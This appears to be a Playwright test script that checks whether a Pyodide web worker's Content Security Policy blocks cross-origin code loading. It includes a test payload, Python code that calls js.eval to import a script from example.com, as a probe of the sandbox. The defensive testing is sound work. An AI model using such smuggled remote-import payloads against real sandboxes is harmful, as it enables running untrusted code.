// Python worker: does Pyodide still load under the CSP, and is import() of another origin blocked?
import { chromium } from "playwright";
const b = await chromium.launch();
const p = await b.newPage();
p.context().on("request", (q) => q.url().includes("example.com") && console.log("REQUEST LEAKED", q.url()));
p.on("worker", (w) => w.on("console", (m) => console.log("worker:", m.text())));
await p.goto("http://localhost:3000/");
const h = await (await fetch("http://localhost:3000/workers/py-runner.js")).headers.get("content-security-policy");
console.log("csp:", h);
const r = await p.evaluate(
  () =>
    new Promise((res) => {
      const w = new Worker("/workers/py-runner.js", { type: "module" });
      const code = "import js\ndef f(x):\n    js.eval(\"import('https://example.com/x.js').then(()=>console.log('LEAK'),e=>console.log('blocked'))\")\n    return 1+1";
      w.onmessage = (e) => {
        if (e.data.type === "ready") w.postMessage({ code, functionName: "f", cases: [[0]] });
        else res(JSON.stringify(e.data).slice(0, 300));
      };
      w.onerror = (e) => res("onerror " + e.message);
      setTimeout(() => res("timeout"), 90000);
    }),
);
console.log(r);
await b.close();
